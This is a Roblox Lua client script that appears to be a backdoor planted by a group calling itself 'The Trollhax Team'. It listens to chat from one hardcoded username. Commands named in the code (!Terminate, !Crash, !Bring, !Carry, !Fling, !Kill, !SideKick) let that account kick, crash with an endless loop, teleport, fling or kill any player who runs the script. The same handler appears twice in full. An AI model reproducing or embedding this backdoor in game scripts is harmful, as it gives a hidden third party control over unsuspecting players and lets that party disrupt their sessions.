local Moderator = "8RR0R404"

local Players = game.Players:GetPlayers()

for i, v in pairs(Players) do
	if v.Name == Moderator then
		v.Chatted:Connect(function(Command)
		local CommandParts = {}


		for v in Command:gmatch("[^%s]+") do
			table.insert(CommandParts, v)
		end


			if CommandParts[1] == "!Terminate" then
				if CommandParts[2] == game.Players.LocalPlayer.Name then
				game.Players.LocalPlayer:Kick("Your connection has been terminated by The Trollhax Team: ".. CommandParts[3])
				end
			end


			if Command == "!Crash ".. game.Players.LocalPlayer.Name then
				while true do
					print("Your connection has been Crashed by The Trollhax Team.")
				end
			end


			if Command == "!Bring ".. game.Players.LocalPlayer.Name then
				game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(Moderator).Character:WaitForChild("HumanoidRootPart").CFrame
			end


			if Command == "!Carry ".. game.Players.LocalPlayer.Name then
				repeat
					wait()
					game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(Moderator).Character:WaitForChild("HumanoidRootPart").CFrame
				until game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health == 0
			end


			if Command == "!Fling ".. game.Players.LocalPlayer.Name then
				game.Players.LocalPlayer.Character.Humanoid.UseJumpPower = true
				local JumpPower = game.Players.LocalPlayer.Character.Humanoid.JumpPower
				wait(0.1)
				game.Players.LocalPlayer.Character.Humanoid.JumpPower = 500
				wait(0.1)
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
				wait(0.1)
				game.Players.LocalPlayer.Character.Humanoid.Sit = true
				wait(1)
				game.Players.LocalPlayer.Character.Humanoid.JumpPower = JumpPower
			end


			if Command == "!Kill ".. game.Players.LocalPlayer.Name then
				game.Players.LocalPlayer.Character.Humanoid.Health = 0
			end


			if CommandParts[1] == "!SideKick" then
				if CommandParts[3] == game.Players.LocalPlayer.Name then
				while true do
					wait()
					game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(CommandParts[2]).Character:WaitForChild("HumanoidRootPart").CFrame
					end
				end
			end




		end)
	end
end







































game.Players.PlayerAdded:Connect(function(Player)
	if Player.Name == Moderator then
		Player.Chatted:Connect(function(Command)
		local CommandParts = {}


		for v in Command:gmatch("[^%s]+") do
			table.insert(CommandParts, v)
		end


			if CommandParts[1] == "!Terminate" then
				if CommandParts[2] == game.Players.LocalPlayer.Name then
				game.Players.LocalPlayer:Kick("Your connection has been terminated by The Trollhax Team: ".. CommandParts[3])
				end
			end


			if Command == "!Crash ".. game.Players.LocalPlayer.Name then
				while true do
					print("Your connection has been Crashed by The Trollhax Team.")
				end
			end


			if Command == "!Bring ".. game.Players.LocalPlayer.Name then
				game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(Moderator).Character:WaitForChild("HumanoidRootPart").CFrame
			end


			if Command == "!Carry ".. game.Players.LocalPlayer.Name then
				repeat
					wait()
					game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(Moderator).Character:WaitForChild("HumanoidRootPart").CFrame
				until game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Health == 0
			end


			if Command == "!Fling ".. game.Players.LocalPlayer.Name then
				game.Players.LocalPlayer.Character.Humanoid.UseJumpPower = true
				local JumpPower = game.Players.LocalPlayer.Character.Humanoid.JumpPower
				wait(0.1)
				game.Players.LocalPlayer.Character.Humanoid.JumpPower = 500
				wait(0.1)
				game.Players.LocalPlayer.Character.Humanoid.Jump = true
				wait(0.1)
				game.Players.LocalPlayer.Character.Humanoid.Sit = true
				wait(1)
				game.Players.LocalPlayer.Character.Humanoid.JumpPower = JumpPower
			end


			if Command == "!Kill ".. game.Players.LocalPlayer.Name then
				game.Players.LocalPlayer.Character.Humanoid.Health = 0
			end


			if CommandParts[1] == "!SideKick" then
				if CommandParts[3] == game.Players.LocalPlayer.Name then
				while true do
					wait()
					game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players:WaitForChild(CommandParts[2]).Character:WaitForChild("HumanoidRootPart").CFrame
					end
				end
			end




		end)
	end
end)
